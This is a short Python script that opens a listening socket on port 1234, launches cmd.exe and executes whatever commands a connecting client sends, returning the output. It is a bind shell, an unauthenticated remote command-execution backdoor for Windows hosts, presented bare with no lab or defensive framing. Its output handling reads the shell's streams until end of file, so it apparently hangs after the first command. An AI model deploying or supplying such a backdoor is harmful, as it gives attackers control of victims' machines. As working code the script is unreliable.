import socket
import subprocess

# Replace with your preferred listening IP and port
LISTEN_IP = '0.0.0.0'
LISTEN_PORT = 1234

def main():
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Bind the socket to the listening IP and port
        s.bind((LISTEN_IP, LISTEN_PORT))
        
        # Start listening for connections
        s.listen(1)
        
        print(f"[*] Listening on {LISTEN_IP}:{LISTEN_PORT}")
        
        while True:
            # Accept incoming connection
            conn, addr = s.accept()
            print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
            
            # Start a new shell process
            proc = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            
            # Read command from the connection and execute it
            while True:
                # Receive command from the client
                command = conn.recv(1024).decode()
                
                # Execute the command
                if command.strip().lower() == 'exit':
                    break
                else:
                    # Execute the command in the shell process
                    proc.stdin.write(command.encode())
                    proc.stdin.flush()
                    
                    # Read the output and send it back to the client
                    output = proc.stdout.read() + proc.stderr.read()
                    conn.send(output)
            
            # Close the connection
            conn.close()
            print(f"[*] Connection from {addr[0]}:{addr[1]} closed")
            
    except Exception as e:
        print(f"[*] Error: {str(e)}")
        pass

if __name__ == '__main__':
    main()
